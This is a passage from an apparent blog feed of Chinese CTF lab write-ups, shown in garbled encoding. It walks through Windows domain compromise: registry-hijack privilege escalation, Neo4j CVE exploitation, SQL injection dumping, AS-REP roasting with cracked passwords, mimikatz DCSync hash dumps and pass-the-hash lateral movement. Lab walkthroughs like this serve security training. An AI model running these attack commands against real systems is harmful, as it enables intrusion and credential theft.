åƒåŠ«æŒï¼Œä½¿ç”¨æ”¾å¤§é•œè¿›è¡Œææƒï¼Œå…¶å®ä¹Ÿå°±æ˜¯æŠŠæœ¬æ¥ç”¨æˆ·ä¸»é¡µç‚¹æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\windows\system32\cmd.exeï¼Œè¿™æ ·å°±ç›´æ¥ææƒæˆsystemäº†ï¼Œå…ˆæŠŠshellå’Œmimikatzä¼ ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><p>å°†å±å¹•é”å®šï¼Œç„¶åæ‰“å¼€æ”¾å¤§é•œå°±æ˜¯systemæƒé™ç»ˆç«¯äº†ï¼Œå¯ä»¥åˆ©ç”¨csåšè½¬å‘ä¸Šçº¿ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯æŠ“å–å“ˆå¸Œï¼Œå…ˆæ‹¿ä¸ªflagç„¶åæ‹¿å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514</span><br><span class="line">1000    DC01$   d61a2af9b1ab466717017651fd1c781b        532480</span><br><span class="line">500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512</span><br><span class="line">1103    WIN2016$        3505cfb2a6769aff4c8cd85687257d29        16781312</span><br><span class="line">1104    WIN19-CLIENT$   17258d4f49268599b4ff63c40d5b95a2        16781312</span><br><span class="line">1105    Aldrich baef402f3580fe1c75dfceaef4ae419f        512</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯ç»å…¸çš„æ¨ªå‘äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Time</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Time.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Time.html</id>
    <published>2024-08-20T15:24:07.837Z</published>
    <updated>2024-08-20T15:35:36.444Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Time</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">39.99.255.178:1337 open</span><br><span class="line">39.99.255.178:7473 open</span><br><span class="line">39.99.255.178:7474 open</span><br><span class="line">39.99.255.178:7687 open</span><br><span class="line">39.99.255.178:39773 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">å·²å®Œæˆ 0/5 [-] webtitle https://39.99.255.178:1337 Get <span class="string">&quot;https://39.99.255.178:1337&quot;</span>: EOF</span><br><span class="line">[*] WebTitle: http://39.99.255.178:7474 code:303 len:0      title:None è·³è½¬url: http://39.99.255.178:7474/browser/</span><br><span class="line">[*] WebTitle: http://39.99.255.178:7474/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7473 code:303 len:0      title:None è·³è½¬url: https://39.99.255.178:7473/browser/</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7687 code:400 len:50     title:None</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7473/browser/ code:200 len:3279   title:Neo4j Browser</span><br></pre></td></tr></table></figure><p>å‘ç°neo4jï¼Œä½¿ç”¨CVE-2021-34371æ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget.jar rmi://39.98.110.107:1337 <span class="string">&quot;touch /tmp/123&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/neo4j/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«æå†…ç½‘ï¼Œæ­å»ºä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe05:e4f7  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:05:e4:f7  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 135368  bytes 165481073 (165.4 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 71891  bytes 15950459 (15.9 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.6.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetBios: 172.22.6.25     XIAORANG\WIN2019               </span><br><span class="line">[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:åå°ç™»å½•</span><br><span class="line">[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None</span><br></pre></td></tr></table></figure><p>è®¿é—®38çš„åå°ç•Œé¢ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œå¯ä»¥æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r requests.txt -D oa_db -T oa_f1Agggg --dump --batch</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>ä»æ•°æ®åº“ä¸­å¯ä»¥æ‹¿åˆ°ä¸€å †ç”¨æˆ·åï¼Œè¡¨å¤§å°çš„åŸå› å¯èƒ½å¯¼è‡´æ˜¾ç¤ºä¸å…¨ï¼Œéœ€è¦åœ¨excelè¡¨ä¸­æ‰¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;username.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> files:</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… email</span></span><br><span class="line">        email_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\b[\w.-]+@xiaorang\.lab\b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æå–æ‰€æœ‰åŒ¹é…çš„ email</span></span><br><span class="line">        emails = email_pattern.findall(file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å‡ºæ‰€æœ‰ email</span></span><br><span class="line">        <span class="keyword">for</span> email <span class="keyword">in</span> emails:</span><br><span class="line">            <span class="built_in">print</span>(email)</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬å¯ä»¥æŠŠç”¨æˆ·åæå‡ºæ¥ï¼Œå…ˆç¡®è®¤ä¸€ä¸‹å“ªäº›æ˜¯æœ‰æ•ˆçš„åŸŸå†…ç”¨æˆ·ï¼Œç„¶åç”¨è„šæœ¬æå–å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 172.22.6.12 -d xiaorang.lab username.txt -t 10</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">weixian@xiaorang.lab</span><br><span class="line">shuzhen@xiaorang.lab</span><br><span class="line">xuanjiang@xiaorang.lab</span><br><span class="line">wengbang@xiaorang.lab</span><br><span class="line">xiqidi@xiaorang.lab</span><br><span class="line">gaiyong@xiaorang.lab</span><br><span class="line">yuanchang@xiaorang.lab</span><br><span class="line">lvhui@xiaorang.lab</span><br><span class="line">wenbo@xiaorang.lab</span><br><span class="line">zhenjun@xiaorang.lab</span><br><span class="line">jinqing@xiaorang.lab</span><br><span class="line">yangju@xiaorang.lab</span><br><span class="line">weicheng@xiaorang.lab</span><br><span class="line">weixian@xiaorang.lab</span><br><span class="line">haobei@xiaorang.lab</span><br><span class="line">jingze@xiaorang.lab</span><br><span class="line">zhaoxiu@xiaorang.lab</span><br><span class="line">jizhen@xiaorang.lab</span><br><span class="line">qiyue@xiaorang.lab</span><br><span class="line">rubao@xiaorang.lab</span><br><span class="line">liangliang@xiaorang.lab</span><br><span class="line">tangshun@xiaorang.lab</span><br><span class="line">chouqian@xiaorang.lab</span><br><span class="line">jicheng@xiaorang.lab</span><br><span class="line">xiyi@xiaorang.lab</span><br><span class="line">chenghui@xiaorang.lab</span><br><span class="line">beijin@xiaorang.lab</span><br><span class="line">yanglang@xiaorang.lab</span><br><span class="line">chebin@xiaorang.lab</span><br><span class="line">pengyuan@xiaorang.lab</span><br><span class="line">jihuan@xiaorang.lab</span><br><span class="line">duanmuxiao@xiaorang.lab</span><br><span class="line">gaijin@xiaorang.lab</span><br><span class="line">hongzhi@xiaorang.lab</span><br><span class="line">yifu@xiaorang.lab</span><br><span class="line">fusong@xiaorang.lab</span><br><span class="line">tangrong@xiaorang.lab</span><br><span class="line">luwan@xiaorang.lab</span><br><span class="line">dongcheng@xiaorang.lab</span><br><span class="line">zhufeng@xiaorang.lab</span><br><span class="line">lianhuangchen@xiaorang.lab</span><br><span class="line">lili@xiaorang.lab</span><br><span class="line">wenshao@xiaorang.lab</span><br><span class="line">huabi@xiaorang.lab</span><br><span class="line">rangsibo@xiaorang.lab</span><br><span class="line">wohua@xiaorang.lab</span><br><span class="line">haoguang@xiaorang.lab</span><br><span class="line">langying@xiaorang.lab</span><br><span class="line">manxue@xiaorang.lab</span><br><span class="line">diaocai@xiaorang.lab</span><br><span class="line">baqin@xiaorang.lab</span><br><span class="line">lianggui@xiaorang.lab</span><br><span class="line">louyou@xiaorang.lab</span><br><span class="line">chengqiu@xiaorang.lab</span><br><span class="line">weishengshan@xiaorang.lab</span><br><span class="line">maqun@xiaorang.lab</span><br><span class="line">wenbiao@xiaorang.lab</span><br><span class="line">zhangxin@xiaorang.lab</span><br><span class="line">chuyuan@xiaorang.lab</span><br><span class="line">wenliang@xiaorang.lab</span><br><span class="line">luyue@xiaorang.lab</span><br><span class="line">yulvxue@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br><span class="line">guohong@xiaorang.lab</span><br><span class="line">pangzhen@xiaorang.lab</span><br><span class="line">sheweiyue@xiaorang.lab</span><br><span class="line">lezhong@xiaorang.lab</span><br><span class="line">dujian@xiaorang.lab</span><br><span class="line">lidongjin@xiaorang.lab</span><br><span class="line">hongqun@xiaorang.lab</span><br><span class="line">yexing@xiaorang.lab</span><br><span class="line">maoda@xiaorang.lab</span><br><span class="line">qiaomei@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br></pre></td></tr></table></figure><h3 id="AS-REPRoasting">AS-REPRoasting</h3><p>åœ¨AS_REPé˜¶æ®µï¼Œä¼šè¿”å›ç”±æˆ‘ä»¬è¯·æ±‚çš„åŸŸè´¦æˆ·hashåŠ å¯†æŸä¸ªå€¼åè¿”å›ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡è‡ªèº«çš„ntlm hashå»è§£å¯†å¾—åˆ°æ•°æ®ã€‚åœ¨è¿™é‡Œè®¾ç½®ä¸è¦æ±‚é¢„èº«ä»½éªŒè¯åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨AS_REQé˜¶æ®µï¼Œå¡«å†™æƒ³è¦ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·åï¼Œéšåä¼šç”¨ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·åNTLM HashåŠ å¯†è¿”å›ç»™æˆ‘ä»¬ã€‚éšåæˆ‘ä»¬å°±å¯ä»¥æ‹¿å»çˆ†ç ´äº†</p><p>ä½¿ç”¨åŸŸå†…æœ‰æ•ˆç”¨æˆ·å»æŸ¥SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ°ä¸¤ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23<span class="variable">$wenshao</span>@xiaorang.lab@XIAORANG.LAB:48943048f6bc84479d855419597b7700<span class="variable">$3a745d07844aeda98c3f774b382f42d0126606d0aa030ffd6d4992ef60ecc8abc770ee4dffe49ba0ed9ce93549a7540f20f1fffa0f667cb4354f5a1ed25c3c64961967729997e8190989ed990e36558d6b3e85d0403caa763187fee7b6b57facea423d08b5371668b3406bbef49d742b1dd09026928ca38b915fe74a0161d489f4502703510e6c2d6b5e33db2f5eaa61f7ec5bbb5f6267305b46835baf2f1ecf5c1681019f1de85f34331abaa399f067c67e064c344017ab736d96cdc741a6f71e28c90c8c351a1f894cee8cd1cfef6ab98232ac372850f9ad433ed8e1617302825a7682291da5890e70d0f0</span></span><br><span class="line">$krb5asrep$23<span class="variable">$zhangxin</span>@xiaorang.lab@XIAORANG.LAB:3acdd0fbfdd7ff3e9b671009f07cd6dc<span class="variable">$b5fe8d174a85d538df4b1660f58758069e1a5393d6c3957f16026e0808f32e845a1c921bade6b247b831480743f5b6dedc2a1fc46025e0b5ea5878dafb090fb7b9e5dbb281faeb5e713976144769c5e248e404df8644cf1fe1abc326936724b0bf9af647630d7784b14deed290299170dde2d49cee2ed28b86d33085d830456a75d96d86b1a83f917338e0047842374433310c7d1f3a12e924eafaa344f30ef2e1a095608f99a55c9f1c550c17031d88eb901919c3f806ba05bf4c3f4dc4b8993fb60f9d2a6e0cdebf727e0908bc7b61ff559b507f68b24cc41c5f43a8e5173642fdac1e105ef49c5bad16a9</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´æ˜æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force hash.txt ./rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wenshao@xiaorang.lab:hellokitty</span><br><span class="line">zhangxin@xiaorang.lab:strawberry</span><br></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€æ³¢rdp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.6.1/24 -u user.txt -p pass.txt --continue-on-success 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820224508866.png" alt="image-20240820224508866"></p><p>rdpä¸Šå»ï¼Œç”¨bloodhoundåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820224845973.png" alt="image-20240820224845973"></p><p>å¦‚æœå°†AåŸŸä¸­çš„åŸŸç”¨æˆ·è¿ç§»åˆ°BåŸŸä¸­ï¼Œé‚£ä¹ˆåœ¨BåŸŸä¸­è¯¥ç”¨æˆ·çš„SIDä¼šéšä¹‹æ”¹å˜ï¼Œè¿›è€Œå½±å“è¿ç§»åç”¨æˆ·çš„æƒé™ï¼Œå¯¼è‡´è¿ç§»åçš„ç”¨æˆ·ä¸èƒ½è®¿é—®æœ¬æ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚SID Historyçš„ä½œç”¨æ˜¯åœ¨åŸŸè¿ç§»è¿‡ç¨‹ä¸­ä¿æŒåŸŸç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³å¦‚æœè¿ç§»åç”¨æˆ·çš„SIDæ”¹å˜äº†ï¼Œç³»ç»Ÿä¼šå°†å…¶åŸæ¥çš„SIDæ·»åŠ åˆ°è¿ç§»åç”¨æˆ·çš„SID Historyå±æ€§ä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰æƒé™ã€èƒ½å¤Ÿè®¿é—®å…¶åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚</p><p>ç®€å•æ¥è¯´yuxuanå±äºåŸŸç®¡ï¼Œæ‰€ä»¥ç°åœ¨æ‹¿åˆ°yuxuançš„æƒé™ç„¶ådumpå“ˆå¸Œå°±å¥½äº†ï¼Œä¸Šå°è±†å­æ”¶é›†ä¸€æ³¢ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â•”â•â•â•â•â•â•â•â•â•â•â•£ Looking <span class="keyword">for</span> AutoLogon credentials</span><br><span class="line">    Some AutoLogon credentials were found</span><br><span class="line">    DefaultDomainName             :  xiaorang.lab</span><br><span class="line">    DefaultUserName               :  yuxuan</span><br><span class="line">    DefaultPassword               :  Yuxuan7QbrgZ3L</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è‡ªåŠ¨ç™»å½•ç”¨æˆ·ï¼Œæ­£å¥½å°±æ˜¯yuxuanï¼Œç”¨æ­¤ç”¨æˆ·rdpä¸Šå»ï¼ŒdumpåŸŸç®¡å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC-PROGAME.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512</span><br><span class="line">1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512</span><br><span class="line">1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512</span><br><span class="line">1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512</span><br><span class="line">1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512</span><br><span class="line">1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512</span><br><span class="line">1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512</span><br><span class="line">1111    wenbo   9abb7115997ea03785e92542f684bdde        512</span><br><span class="line">1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512</span><br><span class="line">1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512</span><br><span class="line">1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512</span><br><span class="line">1117    weicheng        796a774eace67c159a65d6b86fea1d01        512</span><br><span class="line">1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512</span><br><span class="line">1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512</span><br><span class="line">1120    jizhen  1840c5130e290816b55b4e5b60df10da        512</span><br><span class="line">1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512</span><br><span class="line">1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512</span><br><span class="line">1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512</span><br><span class="line">1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512</span><br><span class="line">1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512</span><br><span class="line">1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512</span><br><span class="line">1127    chouqian        c6f0585b35de1862f324bc33c920328d        512</span><br><span class="line">1128    jicheng 159ee55f1626f393de119946663a633c        512</span><br><span class="line">1129    xiyi    ee146df96b366efaeb5138832a75603b        512</span><br><span class="line">1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512</span><br><span class="line">1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512</span><br><span class="line">1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512</span><br><span class="line">1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512</span><br><span class="line">1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512</span><br><span class="line">1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512</span><br><span class="line">1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512</span><br><span class="line">1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512</span><br><span class="line">1138    gaijin  